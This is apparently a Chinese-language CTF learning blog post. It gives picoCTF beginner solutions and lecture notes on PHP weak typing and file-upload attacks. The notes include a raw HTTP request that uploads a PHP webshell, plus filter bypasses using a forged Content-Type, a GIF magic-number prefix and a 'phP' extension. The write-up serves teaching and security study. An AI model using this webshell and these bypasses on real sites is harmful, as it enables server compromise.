---
title: IThome 2024 鐵人賽 一直刷 CTF - Day6
tags:
  - IThome 2024 鐵人賽
  - CTF
  - 資安
categories:
  - IThome 2024 鐵人賽
  - 一直刷 CTF
abbrlink: 59208
date: 2024-09-09 00:00:00
lang:
---

## 前言

本日進度：

- [x] 6 題 general skills
- [x] [【成大資安社社課】WEB 1 - 到 Lab - 看完](https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)

<!--more-->

## Writeup

### 第一題：Static ain't always noise

利用 `ltdis.sh` 分解 `static` 檔案，就可以從 `static.ltdis.strings.txt` 中找到 Flag 了

![Image](https://i.imgur.com/SXcqpHY.png)
![Image](https://i.imgur.com/kkgEVwM.png)

### 第二題：Nice netcat...

nc 過去之後會噴很多數字出來，感覺像是 ASCII 碼，所以就把他轉成文字就是 Flag 了，我寫了個簡單的程式

```python
text = ""

while True:
    try:
        num = int(input())
        text += chr(num)
    except:
        break

print(text)
```

![Image](https://i.imgur.com/bnhklQB.png)

### 第三題：Obedient Cat

就載下來印出來就是 Flag 了

### 第四題：2Warm

把 42 轉成 2 進位，然後用 picoCTF{} 包起來就是 Flag 了

### 第五題：First Grep

下載檔案後，用 `grep` 就能找到 Flag 了
![Image](https://i.imgur.com/J6bJSP2.png)

### 第六題：Bases

用 `base64` 解碼就能得到 Flag 了

![Image](https://i.imgur.com/hyNbDA7.png)

## 上課紀錄

### Language Trick - php

- 簡單語法
  ![Image](https://i.imgur.com/aYvLppY.png)
- Weak type
  ![Image](https://i.imgur.com/48FxJ2B.png)
  `0e` 開頭的東西會自動轉型成科學記號
  ![Image](https://i.imgur.com/qEtbysm.png)
  ![Image](https://i.imgur.com/hHMLZzs.png)
  ![Image](https://i.imgur.com/33d9yla.png)
  ![Image](https://i.imgur.com/UPtQUT0.png)
  還有其他若型別轉換的範例，如下的真直表
  ![Image](https://i.imgur.com/a6tRpHz.png)
- Parameter Array
  ![Image](https://i.imgur.com/Zb2FjOA.png)
- Lab - phpisnice
  ![Image](https://i.imgur.com/OWX8SdF.png)
  雖然他 Lab 還是關掉了，但他有給 code ，所以我可以自己玩玩看!
  去查剛剛那些 [MD5 會有問題的字串](https://github.com/JohnHammond/ctf-katana?tab=readme-ov-file#php) 然後找到了這個
  
  | String     | MD5                             |
  | ---------- | ------------------------------- |
  |0e215962017 | 0e291242476940776845150308577824|
  
  指定 A=0e215962017 這題應該就能拿到 Flag 了
- Lab - phpisbest
  ![Image](https://i.imgur.com/6Qa6T5t.png)
  因為他要先過 `strcmp($A, $B) == 0` 所以先把兩個用成不一樣的陣列，這樣會 `null == 0 -> true` 就過了，然後 MD5 只要兩個都是陣列就會 `null == null -> true`，就可以拿到 Flag 了
- File vs Route
  ![Image](https://i.imgur.com/V4YZb0h.png)
  ![Image](https://i.imgur.com/OQyQqYj.png)
  ![Image](https://i.imgur.com/1MELC6v.png)
- Webshell (shell on web)
  惡意的 Webshell
  ![Image](https://i.imgur.com/WfJcHBd.png)
  ![Image](https://i.imgur.com/bGzjcIh.png)

  ```plaintext
    POST /upload.php HTTP/1.1\r\n
  Content-Length: 80172\r\n
  Content-Type: multipart/form-data; boundary=----meow\r\n
  \r\n
  ------owo\r\n
  Content-Disposition: form-data; name="upload"; filename="ouo.txt"\r\n
  Content-Type: text/plain\r\n
  \r\n
  (File Content)
  \r\n
  ------owo--\r\n
  ```

  改成

  ```plaintext
  POST /upload.php HTTP/1.1\r\n
  Content-Length: 80172\r\n
  Content-Type: multipart/form-data; boundary=----meow\r\n
  \r\n
  ------owo\r\n
  Content-Disposition: form-data; name="upload"; filename="webshell.php"\r\n
  Content-Type: text/php\r\n
  \r\n
  <?php system($_GET['cmd']);?>
  \r\n
  ------owo--\r\n
  ```

  怎麼抵擋呢?
  1. 錯誤示範 - 用前端擋，可以輕易繞過
    ![Image](https://i.imgur.com/nu7sTqM.png)
  2. 檢查 File Content Type
      但是如果把 Request 的 Content-Type 改掉 (例如image/png) 就可以 bypass 了
  3. 檢查 File signature
      - magic number: 透過檢查檔案的開頭幾個 byte 來判斷檔案類型
        ![Image](https://i.imgur.com/Wei7vN0.png)
        但這東西也很容易被偽造，只要在前面加上簽名就可以了
        ![Image](https://i.imgur.com/0Qgu6l8.png)
        在前面加上 gif87a 後端就會以為上傳的是 gif
  4. 副檔名
      - whitelist
      - blacklist
      ![Image](https://i.imgur.com/Fx6F16L.png)
      但需要全部都擋掉，不然把副檔名改成 `phP` 之類的就可能可以繞過
- Lab - uploader (lab 關掉了)
  照抄剛剛可以觸發 Webshell php，然後就能從根目錄取得 Flag 了
- Lab - uploader-waf (lab 關掉了)
  他有改 content-type 和副檔名，所以要把前面的 `Content-Type: text/php` 改成 `Content-Type: image/png`，然後把副檔名改成 `phP` 就可以繞過了，接下來就跟上一題一樣在根目錄取得 Flag

## 參考資料

- [【成大資安社社課】手把手Python教學 --- 從入門到入侵](https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】WEB 1](https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】WEB 2](https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】不是web3.0的 web3 - Vincent55](https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV)
- [【成大資安社社課】Crypto 1](https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】Crypto 2](https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】Linux 基礎指令與使用者管理](https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】淺談網路與 H T T P](https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
